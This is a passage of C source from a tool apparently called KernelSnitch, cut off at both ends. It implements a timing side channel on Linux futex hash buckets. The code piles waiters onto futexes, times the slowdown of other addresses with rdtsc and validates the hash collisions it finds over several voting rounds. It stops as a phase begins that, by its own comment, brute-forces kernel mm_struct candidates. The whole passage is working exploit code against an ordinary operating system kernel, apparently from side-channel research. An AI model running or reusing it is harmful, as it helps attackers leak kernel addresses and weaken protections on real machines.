    ks->v9_disc_t2c_votes = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_c2t_votes = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_t2c_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_t2c_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_c2t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_c2t_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->v9_disc_count = 0;
    pr_info("KS_SETUP mark=5\n");
    ks_stage_partial_writef("stage=setup mark=5\n");
    ks->v9_strict_count = 0;
    ks->v5_page_count = 0;
    ks->v5_selected_page = 0;
    ks->v5_selected_candidates = 0;
    ks->candidate1_count = 0;
    ks->candidate2_count = 0;
    ks->candidate3_count = 0;
    ks->stable_candidate_count = 0;
    ks->accepted_count = 0;
    ks->rounds_completed = 0;
    for (size_t i = 0; i < ks->candidate_max; ++i) {
        ks->candidate_t2c_votes[i] = 0;
        ks->candidate_c2t_votes[i] = 0;
        ks->candidate_c2c_votes[i] = 0;
        ks->candidate_initial_before[i] = 0;
        ks->candidate_initial_after[i] = 0;
    }
    for (size_t i = 0; i < ks->candidate_max * KS_RUN16_VOTING_ROUNDS; ++i) {
        ks->candidate_t2c_before[i] = 0;
        ks->candidate_t2c_after[i] = 0;
        ks->candidate_c2t_before[i] = 0;
        ks->candidate_c2t_after[i] = 0;
        ks->candidate_c2c_before[i] = 0;
        ks->candidate_c2c_after[i] = 0;
    }
    ks->pile2_anchor = 0;
    ks->pile2_anchor_id = 0;

    pr_info("KS_SETUP mark=6\n");
    ks_stage_partial_writef("stage=setup mark=6\n");
    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm scan stride=%zx align=%zx mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        (size_t)KS_MM_STRUCT_STRIDE,
        (size_t)KS_MM_STRUCT_ALIGN,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
static int ks_v9_validate_pair(struct kernelsnitch_shared_state *ks,
                               size_t target_addr, size_t candidate_id,
                               size_t approx_time, size_t threshold,
                               volatile size_t *t2c_votes,
                               volatile size_t *c2t_votes,
                               volatile size_t *t2c_before,
                               volatile size_t *t2c_after,
                               volatile size_t *c2t_before,
                               volatile size_t *c2t_after,
                               size_t idx)
{
    volatile unsigned int *candidate_word =
        (volatile unsigned int *)&ks->futexes[candidate_id];

    if (candidate_id >= FUTEX_SZ || candidate_id == 0 ||
        (((size_t)candidate_word) % sizeof(unsigned int)) != 0)
        return 0;
    if (*candidate_word != 0)
        *candidate_word = 0;

    for (size_t round = 0; round < KS_RUN16_VOTING_ROUNDS; ++round) {
        size_t probe_before = 0;
        size_t probe_after = 0;
        int passed = 0;
        struct ks_pile_waiters pile;

        if (!__wait_bucket_idle((size_t)candidate_word, approx_time)) {
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=target->candidate checked=1 passed=0 reason=busy-baseline\n",
                        (size_t)candidate_word, round);
            return 0;
        }
        probe_before = __measure((size_t)candidate_word);
        if (__increase_addr(ks, (unsigned int *)target_addr,
                            APPENDED_FUTEXES, FUTEX_WAIT_PRIVATE, 0, &pile) != 0) {
            __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            (void)__wait_bucket_idle((size_t)candidate_word, approx_time);
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=target->candidate checked=1 passed=0 reason=pile before=%zu after=%zu threshold=%zu\n",
                        (size_t)candidate_word, round, probe_before,
                    probe_after, threshold);
            return 0;
        }
        /* Confirm queueing with exactly one wake so at most one waiter is
         * consumed, then measure the opposite bucket while the pile remains
         * queued.  Draining the pile first reproduces the run27 idle-bucket
         * failure. */
        size_t confirm;
        size_t t0;
        size_t t1;
        usleep(50000);
        t0 = rdtsc_begin();
        __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE, 0,
                NULL, NULL, 0);
        t1 = rdtsc_end();
        confirm = t1 - t0;
        if (confirm <= approx_time * 3) {
            __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            int pile_idle =
                __wait_bucket_idle(target_addr, approx_time);
            (void)__increase_addr_drain(&pile);
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=target->candidate checked=1 passed=0 reason=pile-weak before=%zu after=%zu threshold=%zu idle=%d\n",
                        (size_t)candidate_word, round, probe_before,
                        confirm, threshold, pile_idle);
            return 0;
        }
        probe_after = __measure((size_t)candidate_word);
        __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        int idle = __wait_bucket_idle((size_t)candidate_word, approx_time);
        (void)__increase_addr_drain(&pile);
        passed = probe_after > threshold && probe_after > probe_before * 3;
        t2c_before[idx * KS_RUN16_VOTING_ROUNDS + round] = probe_before;
        t2c_after[idx * KS_RUN16_VOTING_ROUNDS + round] = probe_after;
        t2c_votes[idx] += passed ? 1 : 0;
        ks->validation_target_checked++;
        ks->validation_target_passed += passed ? 1 : 0;
        if (ks->verbose)
            pr_info("v11 validate candidate=%016zx round=%zu dir=target->candidate checked=1 passed=%d before=%zu after=%zu threshold=%zu idle=%d\n",
                    (size_t)candidate_word, round, passed ? 1 : 0,
                    probe_before, probe_after, threshold, idle);
        if (!passed)
            return 0;

        if (!__wait_bucket_idle(target_addr, approx_time)) {
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=candidate->target checked=1 passed=0 reason=busy-baseline\n",
                        (size_t)candidate_word, round);
            return 0;
        }
        probe_before = __measure(target_addr);
        if (__increase_addr(ks, (unsigned int *)candidate_word,
                            APPENDED_FUTEXES, FUTEX_WAIT_PRIVATE, 0, &pile) != 0) {
            __futex((unsigned int *)candidate_word, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            (void)__wait_bucket_idle(target_addr, approx_time);
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=candidate->target checked=1 passed=0 reason=pile before=%zu after=%zu threshold=%zu\n",
                        (size_t)candidate_word, round, probe_before,
                    probe_after, threshold);
            return 0;
        }
        usleep(50000);
        t0 = rdtsc_begin();
        __futex((unsigned int *)candidate_word, FUTEX_WAKE_PRIVATE, 0,
                NULL, NULL, 0);
        t1 = rdtsc_end();
        confirm = t1 - t0;
        if (confirm <= approx_time * 3) {
            __futex((unsigned int *)candidate_word, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            int pile_idle =
                __wait_bucket_idle((size_t)candidate_word, approx_time);
            (void)__increase_addr_drain(&pile);
            if (ks->verbose)
                pr_info("v11 validate candidate=%016zx round=%zu dir=candidate->target checked=1 passed=0 reason=pile-weak before=%zu after=%zu threshold=%zu idle=%d\n",
                        (size_t)candidate_word, round, probe_before,
                        confirm, threshold, pile_idle);
            return 0;
        }
        probe_after = __measure(target_addr);
        __futex((unsigned int *)candidate_word, FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        idle = __wait_bucket_idle(target_addr, approx_time);
        (void)__increase_addr_drain(&pile);
        passed = probe_after > threshold && probe_after > probe_before * 3;
        c2t_before[idx * KS_RUN16_VOTING_ROUNDS + round] = probe_before;
        c2t_after[idx * KS_RUN16_VOTING_ROUNDS + round] = probe_after;
        c2t_votes[idx] += passed ? 1 : 0;
        ks->validation_candidate_checked++;
        ks->validation_candidate_passed += passed ? 1 : 0;
        if (ks->verbose)
            pr_info("v11 validate candidate=%016zx round=%zu dir=candidate->target checked=1 passed=%d before=%zu after=%zu threshold=%zu idle=%d\n",
                    (size_t)candidate_word, round, passed ? 1 : 0,
                    probe_before, probe_after, threshold, idle);
        if (!passed)
            return 0;
    }
    return t2c_votes[idx] == KS_RUN16_VOTING_ROUNDS &&
           c2t_votes[idx] == KS_RUN16_VOTING_ROUNDS;
}

void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 5
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    size_t anchor_id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions;
    ks->candidate1_count = 0;
    ks->candidate2_count = 0;
    ks->candidate3_count = 0;
    ks->stable_candidate_count = 0;
    ks->accepted_count = 0;
    ks->rounds_completed = 0;

    /* robust empty-bucket baseline: min over several probes */
    size_t approx_time = __measure((size_t)&ks->futexes[0]);
    for (int probe = 1; probe < 6; probe++) {
        size_t t = __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8 + probe * 64]);
        if (t < approx_time) approx_time = t;
    }

    size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
    if (ks->verbose)
        pr_info("collision threshold approx=%zu thr=%zu\n", approx_time,
                threshold);

    /* Pile self-test: prove the primitive before looking for collisions. */
    size_t self_pile = (size_t)&ks->futexes[0];
    size_t self_before = __measure(self_pile);
    int self_pile_ok = 0;
    struct ks_pile_waiters self_pile_waiters;
    if (__increase_addr(ks, (unsigned int *)self_pile, APPENDED_FUTEXES,
                        FUTEX_WAIT_PRIVATE, 0, &self_pile_waiters) == 0) {
        size_t self_after = __measure(self_pile);
        self_pile_ok = self_after > self_before * 5;
        __futex((unsigned int *)self_pile, FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        (void)__wait_bucket_idle(self_pile, approx_time);
        (void)__increase_addr_drain(&self_pile_waiters);
        if (ks->verbose)
            pr_info("KS_V5_SELFTEST pile addr=%016zx before=%zu after=%zu "
                    "ratio_ge5=%d\n", self_pile, self_before, self_after,
                    self_pile_ok);
    } else {
        if (ks->verbose)
            pr_info("KS_V5_SELFTEST pile addr=%016zx reason=create-waiter\n",
                    self_pile);
    }

    /* Same-page different-offset c2c is a mechanism control.  Accept the
     * control when any tested pair proves cross-offset slowdown. */
    size_t c2c_pile = (size_t)&ks->futexes[KS_PAGE_SIZE];
    size_t c2c_probe = 0;
    size_t c2c_before = 0;
    size_t c2c_after = 0;
    int c2c_selftest_ok = 0;
    for (size_t i = 0; i < KS_V5_SELFTEST_OFFSETS && !c2c_selftest_ok; ++i) {
        c2c_probe = (size_t)&ks->futexes[KS_PAGE_SIZE + 4 + i * 8];
        if (c2c_probe == c2c_pile) continue;
        if (!__wait_bucket_idle(c2c_probe, approx_time)) continue;
        c2c_before = __measure(c2c_probe);
        struct ks_pile_waiters c2c_pile_waiters;
        if (__increase_addr(ks, (unsigned int *)c2c_pile, APPENDED_FUTEXES,
                            FUTEX_WAIT_PRIVATE, 0, &c2c_pile_waiters) != 0) {
            __futex((unsigned int *)c2c_pile, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            (void)__wait_bucket_idle(c2c_probe, approx_time);
            continue;
        }
        c2c_after = __measure(c2c_probe);
        __futex((unsigned int *)c2c_pile, FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        (void)__wait_bucket_idle(c2c_probe, approx_time);
        (void)__increase_addr_drain(&c2c_pile_waiters);
        c2c_selftest_ok = c2c_after > c2c_before * 3 &&
                          c2c_after > threshold;
    }
    if (ks->verbose)
        pr_info("KS_V5_SELFTEST c2c pile=%016zx probe=%016zx before=%zu "
                "after=%zu slow=%d\n", c2c_pile, c2c_probe, c2c_before,
                c2c_after, c2c_selftest_ok);
    if (!self_pile_ok) {
        pr_warning("v6 mechanism selftest failed pile=%d c2c=%d\n",
                   self_pile_ok, c2c_selftest_ok);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }

    /* v9 keeps one fixed pile target and expands the same-bucket search over
     * all candidate pages.  A candidate is meaningful only relative to this
     * target; this preserves bucket transitivity instead of mixing unrelated
     * per-page groups. */
    size_t target_addr = 0;
    size_t target_page = KS_V9_SINGLE_TARGET_PAGE;
    size_t page_ids[KS_V4_SAME_PAGE_OFFSETS];
    size_t page_before[KS_V4_SAME_PAGE_OFFSETS];
    size_t page_after[KS_V4_SAME_PAGE_OFFSETS];
    ks->v5_page_count = KS_V5_PAGE_SCAN_COUNT;
    target_addr = (size_t)&ks->futexes[target_page];
    ks->v9_disc_count = 0;
    ks->v9_strict_count = 0;
    ks_stage_partial_writef("stage=discovery_start target=%016zx pages=%zu\n",
                            target_addr, (size_t)KS_V5_PAGE_SCAN_COUNT);
    for (size_t page_idx = 0; page_idx < KS_V5_PAGE_SCAN_COUNT; ++page_idx) {
        size_t candidate_page = (page_idx + 1) * KS_PAGE_SIZE;
        size_t page_count = 0;
        size_t max_before = 0;
        size_t max_after = 0;
        size_t confirm_time = 0;
        size_t page_rows = 0;
        int page_pile_ok = 0;
        struct ks_pile_waiters page_pile_waiters;

        if (ks->verbose) pr_info("target    %016zx page=%zu/%zu\n",
                                 target_addr, page_idx + 1,
                                 (size_t)KS_V5_PAGE_SCAN_COUNT);
        page_pile_ok = __increase_addr(ks, (unsigned int *)target_addr,
                                       APPENDED_FUTEXES, FUTEX_WAIT_PRIVATE, 0,
                                       &page_pile_waiters) == 0;
        if (!page_pile_ok) {
            pr_warning("KS_V5_PAGE_SCAN page=%zu/%zu valid=0 selftest=FAIL "
                       "candidates=0 max_before=0 max_after=0 threshold=%zu "
                       "confirm=0 reason=pile\n",
                       page_idx + 1, (size_t)KS_V5_PAGE_SCAN_COUNT, threshold);
            ks_stage_partial_writef("stage=discovery_page_failed page=%zu/%zu "
                                    "reason=pile valid=0\n",
                                    page_idx + 1,
                                    (size_t)KS_V5_PAGE_SCAN_COUNT);
            ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
            return;
        }
        usleep(50000);
        {
            uint64_t t0 = rdtsc_begin();
            __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE, 0,
                    NULL, NULL, 0);
            uint64_t t1 = rdtsc_end();
            confirm_time = (size_t)(t1 - t0);
            ks->times[0] = confirm_time;
        }
        for (size_t i = 0; i < KS_V4_SAME_PAGE_OFFSETS; ++i) {
            id = candidate_page + 4 + i * 8;
            futex_addr = (size_t)&ks->futexes[id];
            size_t before = __measure(futex_addr);
            size_t after = __measure(futex_addr);
            if (before > max_before) max_before = before;
            if (after > max_after) max_after = after;
            if (after > threshold) {
                if (ks->v9_disc_count < KS_V9_DISC_MAX) {
                    page_ids[page_rows] = id;
                    page_before[page_rows] = before;
                    page_after[page_rows] = after;
                    ks->v9_disc_idx[ks->v9_disc_count] = id;
                    ks->v9_disc_count++;
                }
                if (page_rows < KS_V4_SAME_PAGE_OFFSETS)
                    page_rows++;
                page_count++;
            }
        }
        __futex((unsigned int *)target_addr, FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        (void)__wait_bucket_idle(target_addr, approx_time);
        (void)__increase_addr_drain(&page_pile_waiters);
        if (ks->verbose)
            pr_info("KS_V5_PAGE_SCAN page=%zu/%zu valid=1 selftest=PASS "
                    "candidates=%zu max_before=%zu max_after=%zu threshold=%zu "
                    "confirm=%zu\n",
                    page_idx + 1, (size_t)KS_V5_PAGE_SCAN_COUNT, page_count,
                    max_before, max_after, threshold, confirm_time);
        ks_partial_candidate_write("page_begin=1 page_index=%zu/%zu page=0x%016zx candidates=%zu max_before=%zu max_after=%zu threshold=%zu confirm=%zu\n",
                                   page_idx + 1,
                                   (size_t)KS_V5_PAGE_SCAN_COUNT,
                                   (size_t)candidate_page, page_rows,
                                   max_before, max_after, threshold,
                                   confirm_time);
        for (size_t i = 0; i < page_rows; ++i) {
            ks_partial_candidate_write("candidate_addr=0x%016zx page=0x%016zx offset=0x%03zx pile=initial accepted=0 t_before=%zu t_after=%zu page_index=%zu/%zu target=0x%016zx confirm=%zu\n",
                                       (size_t)&ks->futexes[page_ids[i]],
                                       (size_t)(page_ids[i] & ~0xffful),
                                       (size_t)(page_ids[i] & 0xfff),
                                       page_before[i], page_after[i],
                                       page_idx + 1,
                                       (size_t)KS_V5_PAGE_SCAN_COUNT,
                                       target_addr, confirm_time);
        }
        ks_partial_candidate_write("page_end=1 page_index=%zu/%zu candidates=%zu fsynced=1\n",
                                   page_idx + 1,
                                   (size_t)KS_V5_PAGE_SCAN_COUNT, page_rows);
        ks_stage_partial_writef("stage=discovery_page_done page=%zu/%zu candidates=%zu max_before=%zu max_after=%zu confirm=%zu\n",
                                page_idx + 1,
                                (size_t)KS_V5_PAGE_SCAN_COUNT, page_rows,
                                max_before, max_after, confirm_time);
    }
    ks_stage_partial_writef("stage=discovery_candidates_done discovered=%zu pages=%zu\n",
                            (size_t)ks->v9_disc_count,
                            (size_t)KS_V5_PAGE_SCAN_COUNT);

    if (ks->v9_disc_count == 0) {
        pr_warning("v12 single-target scan found no candidates target=%016zx pages=%zu\n",
                   target_addr, (size_t)KS_V5_PAGE_SCAN_COUNT);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        ks_stage_partial_writef("stage=collision_not_found reason=no-candidates\n");
        return;
    }

    ks_stage_partial_writef("stage=validation_strict_start candidates=%zu\n",
                            (size_t)ks->v9_disc_count);
    for (size_t i = 0; i < ks->v9_disc_count; ++i) {
        if (ks_v9_validate_pair(ks, target_addr,
                                (size_t)ks->v9_disc_idx[i], approx_time,
                                threshold,
                                ks->v9_disc_t2c_votes,
                                ks->v9_disc_c2t_votes,
                                ks->v9_disc_t2c_before,
                                ks->v9_disc_t2c_after,
                                ks->v9_disc_c2t_before,
                                ks->v9_disc_c2t_after, i))
            ks->v9_strict_count++;
    }
    ks_stage_partial_writef("stage=validation_strict_done survivors=%zu required=%zu\n",
                            (size_t)ks->v9_strict_count,
                            (size_t)KS_V9_MIN_SURVIVORS);

    if (ks->v9_strict_count < KS_V9_MIN_SURVIVORS) {
        pr_warning("v9 strict validation failed survivors=%zu required=%zu target=%016zx\n",
                   (size_t)ks->v9_strict_count,
                   (size_t)KS_V9_MIN_SURVIVORS, target_addr);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        ks_stage_partial_writef("stage=collision_not_found reason=strict-validation\n");
        return;
    }

    ks->futex_addrs[0] = target_addr;
    ks->target_addr = target_addr;
    size_t strict_survivors = 0;
    for (size_t i = 0; i < ks->v9_disc_count &&
         strict_survivors < ks->candidate_max; ++i) {
        if ((size_t)ks->v9_disc_t2c_votes[i] != KS_RUN16_VOTING_ROUNDS ||
            (size_t)ks->v9_disc_c2t_votes[i] != KS_RUN16_VOTING_ROUNDS)
            continue;
        size_t candidate = (size_t)ks->v9_disc_idx[i];
        ks->candidate1_idx[strict_survivors] = candidate;
        ks->candidate_t2c_votes[strict_survivors] = ks->v9_disc_t2c_votes[i];
        ks->candidate_c2t_votes[strict_survivors] = ks->v9_disc_c2t_votes[i];
        for (size_t round = 0; round < KS_RUN16_VOTING_ROUNDS; ++round) {
            ks->candidate_t2c_before[strict_survivors * KS_RUN16_VOTING_ROUNDS + round] =
                ks->v9_disc_t2c_before[i * KS_RUN16_VOTING_ROUNDS + round];
            ks->candidate_t2c_after[strict_survivors * KS_RUN16_VOTING_ROUNDS + round] =
                ks->v9_disc_t2c_after[i * KS_RUN16_VOTING_ROUNDS + round];
            ks->candidate_c2t_before[strict_survivors * KS_RUN16_VOTING_ROUNDS + round] =
                ks->v9_disc_c2t_before[i * KS_RUN16_VOTING_ROUNDS + round];
            ks->candidate_c2t_after[strict_survivors * KS_RUN16_VOTING_ROUNDS + round] =
                ks->v9_disc_c2t_after[i * KS_RUN16_VOTING_ROUNDS + round];
        }
        strict_survivors++;
    }
    ks->candidate1_count = strict_survivors;
    ks->v5_selected_page = target_page;
    ks->v5_selected_candidates = strict_survivors;
    anchor_id = (size_t)ks->candidate1_idx[0];
    ks->anchor_addr = (size_t)&ks->futexes[anchor_id];
    ks->pile2_anchor = ks->anchor_addr;
    ks->pile2_anchor_id = anchor_id;
    for (size_t i = 1; i < strict_survivors &&
         ks->stable_candidate_count < ks->candidate_max; ++i)
        ks->stable_candidate_idx[ks->stable_candidate_count++] =
            (size_t)ks->candidate1_idx[i];
    if (ks->verbose)
        pr_info("KS_V9_SINGLE_TARGET_SELECT target=%016zx discovered=%zu strict=%zu\n",
                target_page, (size_t)ks->v9_disc_count,
                (size_t)ks->v9_strict_count);
    ks->rounds_completed = KS_RUN16_VOTING_ROUNDS;
    ks_stage_partial_writef("stage=collision_accept_start discovered=%zu strict=%zu\n",
                            (size_t)ks->v9_disc_count,
                            (size_t)ks->v9_strict_count);
    if (anchor_id == 0 || ks->stable_candidate_count == 0) {
        pr_warning("bidirectional validation failed anchor=%016zx stable=%zu target_checked=%zu target_passed=%zu candidate_checked=%zu candidate_passed=%zu\n",
                   (size_t)ks->anchor_addr, (size_t)ks->stable_candidate_count,
                   (size_t)ks->validation_target_checked,
                   (size_t)ks->validation_target_passed,
                   (size_t)ks->validation_candidate_checked,
                   (size_t)ks->validation_candidate_passed);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }

    ks->futex_addrs[0] = target_addr;
    ks->futex_addrs[1] = ks->anchor_addr;
    ks->accepted_idx[0] = (size_t)-1;
    ks->accepted_idx[1] = anchor_id;
    ks->accepted_count = 2;

    count = 2;
    for (size_t a = 0; a < ks->stable_candidate_count && count < wanted; ++a) {
        size_t candidate = (size_t)ks->stable_candidate_idx[a];
        if (candidate == anchor_id || candidate >= FUTEX_SZ)
            continue;
        ks->futex_addrs[count] = (size_t)&ks->futexes[candidate];
        ks->accepted_idx[count] = candidate;
        ks->accepted_count++;
        count++;
    }

    if (ks->verbose)
        pr_info("bidirectional validation target_checked=%zu target_passed=%zu candidate_checked=%zu candidate_passed=%zu stable=%zu accepted=%zu\n",
                (size_t)ks->validation_target_checked,
                (size_t)ks->validation_target_passed,
                (size_t)ks->validation_candidate_checked,
                (size_t)ks->validation_candidate_passed,
                (size_t)ks->stable_candidate_count,
                (size_t)ks->accepted_count);

    if (count >= 12) {
        if (ks->verbose) pr_info("found %zd accepted collisions (pile1=%zu pile2=%zu)\n",
                                 count, (size_t)ks->candidate1_count,
                                 (size_t)ks->candidate2_count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd accepted collisions -> cannot continue (pile1=%zu pile2=%zu)\n",
                   count, (size_t)ks->candidate1_count,
                   (size_t)ks->candidate2_count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }

    if (ks->state != KERNELSNITCH_COLLISIONS_FOUND)
        return;
    if (ks->accepted_count < 3) {
        pr_warning("candidate-candidate validation requires two distinct candidates accepted=%zu\n",
                   (size_t)ks->accepted_count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }

    /* Candidate-candidate validation removes global scheduling pollution that
     * can satisfy target<->candidate timing.  Every accepted candidate must,
     * in three independent rounds, slow another accepted candidate in the same
     * private hash bucket. */
    unsigned char *c2c_ok = calloc(ks->accepted_count, sizeof(*c2c_ok));
    if (!c2c_ok) {
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    memset(c2c_ok, 1, ks->accepted_count);
    for (size_t i = 1; i < ks->accepted_count; ++i) {
        size_t pile_addr = (size_t)ks->futex_addrs[i];
        size_t candidate_index = (size_t)-1;
        size_t c2c_votes = 0;
        int candidate_ok = 1;

        for (size_t a = 0; a < ks->candidate1_count; ++a) {
            if ((size_t)ks->candidate1_idx[a] == (size_t)ks->accepted_idx[i]) {
                candidate_index = a;
                break;
            }
        }
        if (candidate_index == (size_t)-1 || candidate_index >= ks->candidate_max) {
            candidate_ok = 0;
        }

        for (size_t round = 0; candidate_ok && round < KS_RUN16_VOTING_ROUNDS; ++round) {
            size_t peer_i;
            size_t peer_addr;
            size_t probe_before = 0;
            size_t probe_after = 0;
            int passed = 0;
            struct ks_pile_waiters pile;
            peer_i = 1 + ((i - 1 + round + 1) % (ks->accepted_count - 1));
            if (peer_i == i) {
                peer_i = 1 + ((i - 1 + 1) % (ks->accepted_count - 1));
                if (peer_i == i) {
                    if (ks->verbose)
                        pr_info("validate candidate=%016zx round=%zu dir=candidate->candidate checked=1 passed=0 reason=no-other-candidate\n",
                                pile_addr, round);
                    candidate_ok = 0;
                    break;
                }
            }
            peer_addr = (size_t)ks->futex_addrs[peer_i];

            if (!__wait_bucket_idle(peer_addr, approx_time)) {
                if (ks->verbose)
                    pr_info("validate candidate=%016zx peer=%016zx round=%zu dir=candidate->candidate checked=1 passed=0 reason=busy-baseline\n",
                            pile_addr, peer_addr, round);
                candidate_ok = 0;
                break;
            }
            probe_before = __measure(peer_addr);
            if (__increase_addr(ks, (unsigned int *)pile_addr,
                                APPENDED_FUTEXES, FUTEX_WAIT_PRIVATE, 0, &pile) != 0) {
                __futex((unsigned int *)pile_addr, FUTEX_WAKE_PRIVATE,
                        APPENDED_FUTEXES + 16, NULL, NULL, 0);
                (void)__wait_bucket_idle(peer_addr, approx_time);
                if (ks->verbose)
                    pr_info("validate candidate=%016zx peer=%016zx round=%zu dir=candidate->candidate checked=1 passed=0 reason=pile before=%zu after=%zu threshold=%zu\n",
                            pile_addr, peer_addr, round, probe_before, probe_after, threshold);
                candidate_ok = 0;
                break;
            }
            probe_after = __measure(peer_addr);
            __futex((unsigned int *)pile_addr, FUTEX_WAKE_PRIVATE,
                    APPENDED_FUTEXES + 16, NULL, NULL, 0);
            (void)__wait_bucket_idle(peer_addr, approx_time);
            (void)__increase_addr_drain(&pile);
            passed = probe_after > threshold && probe_after > probe_before * 3;
            ks->candidate_c2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + round] = probe_before;
            ks->candidate_c2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + round] = probe_after;
            if (candidate_index < ks->candidate_max)
                ks->candidate_c2c_votes[candidate_index] += passed ? 1 : 0;
            c2c_votes += passed ? 1 : 0;
            ks->validation_candidate_candidate_checked++;
            ks->validation_candidate_candidate_passed += passed ? 1 : 0;
            if (ks->verbose)
                pr_info("validate candidate=%016zx peer=%016zx round=%zu dir=candidate->candidate checked=1 passed=%d before=%zu after=%zu threshold=%zu\n",
                        pile_addr, peer_addr, round, passed ? 1 : 0,
                        probe_before, probe_after, threshold);
            if (!passed) {
                candidate_ok = 0;
                break;
            }
        }
        c2c_ok[i] = candidate_ok && c2c_votes == KS_RUN16_VOTING_ROUNDS;
    }

    size_t final_count = 0;
    for (size_t i = 0; i < ks->accepted_count; ++i) {
        if (i == 0 || c2c_ok[i]) {
            ks->futex_addrs[final_count] = ks->futex_addrs[i];
            ks->accepted_idx[final_count] = ks->accepted_idx[i];
            final_count++;
        }
    }
    free(c2c_ok);
    ks->accepted_count = final_count;
    if (final_count < 3 || (size_t)ks->accepted_idx[1] != (size_t)(ks->pile2_anchor_id)) {
        pr_warning("candidate-candidate validation failed accepted=%zu c2c_checked=%zu c2c_passed=%zu\n",
                   final_count,
                   (size_t)ks->validation_candidate_candidate_checked,
                   (size_t)ks->validation_candidate_candidate_passed);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    if (ks->verbose)
        pr_info("candidate-candidate validation c2c_checked=%zu c2c_passed=%zu accepted=%zu\n",
                (size_t)ks->validation_candidate_candidate_checked,
                (size_t)ks->validation_candidate_candidate_passed,
                final_count);
    ks_stage_partial_writef("stage=collision_accept_done accepted=%zu\n",
                            final_count);
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

